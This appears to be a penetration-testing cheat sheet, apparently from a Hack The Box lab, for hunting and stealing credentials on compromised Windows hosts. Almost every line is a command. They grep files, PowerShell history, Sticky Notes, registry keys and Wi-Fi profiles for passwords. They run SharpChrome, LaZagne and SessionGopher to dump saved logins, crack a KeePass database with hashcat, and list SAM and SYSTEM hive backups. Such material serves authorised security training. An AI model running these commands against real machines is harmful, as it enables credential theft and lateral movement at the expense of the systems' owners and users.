# Credential Hunting

### Search for "password" in common config files

```powershell
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
```

### Chrome Custom Dictionary

```powershell
gc 'C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
```

### PowerShell history

```powershell
(Get-PSReadLineOption).HistorySavePath
gc (Get-PSReadLineOption).HistorySavePath
```

### PowerShell history from all user profiles

```powershell
foreach($user in (Get-ChildItem C:\users).FullName){
    Get-Content "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue
}
```

### Credential extraction from XML

```powershell
$credential = Import-Clixml -Path 'C:\scripts\pass.xml'
$credential.GetNetworkCredential().username
$credential.GetNetworkCredential().password
```

---

# Other Files

### Search file contents

```powershell
findstr /SI /M "password" *.xml *.ini *.txt
findstr /SI "password" *.xml *.ini *.txt *.config
findstr /SPIN "password" *.*
powershell "Select-String -Path C:\Users\htb-student\Documents\*.txt -Pattern password"
```

### Search for file extensions of interest

```powershell
dir /S /B *pass*.txt *pass*.xml *pass*.ini *cred* *vnc* *.config*
where /R C:\ *.config
powershell "Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore"
```

### Sticky Notes database

```powershell
ls C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\
powershell "Set-ExecutionPolicy Bypass -Scope Process; cd .\PSSQLite\; Import-Module .\PSSQLite.psd1; $db = 'C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'; Invoke-SqliteQuery -Database $db -Query 'SELECT Text FROM Note' | Format-Table -Wrap"
strings plum.sqlite-wal
```

### Other files of interest

```powershell
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
%WINDIR%\System32\drivers\etc\hosts
C:\ProgramData\Configs\*
C:\Program Files\Windows PowerShell\*
```

---

# Further Credential Theft

### Saved credentials (cmdkey)

```powershell
cmdkey /list
runas /savecred /user:inlanefreight\bob "COMMAND HERE"
```

### Chrome saved passwords

```powershell
.\SharpChrome.exe logins /unprotect
```

### KeePass password cracking

```powershell
python2.7 keepass2john.py ILFREIGHT_Help_Desk.kdbx
hashcat -m 13400 keepass_hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt
```

### LaZagne

```powershell
.\lazagne.exe -h
.\lazagne.exe all
```

### SessionGopher

```powershell
Import-Module .\SessionGopher.ps1
Invoke-SessionGopher -Target WINLPE-SRV01
```

### Clear-text passwords in registry (Autologon)

```powershell
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

### Clear-text passwords in registry (PuTTY)

```powershell
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
```

### Wi-Fi passwords

```powershell
netsh wlan show profile
netsh wlan show profile ilfreight_corp key=clear
```
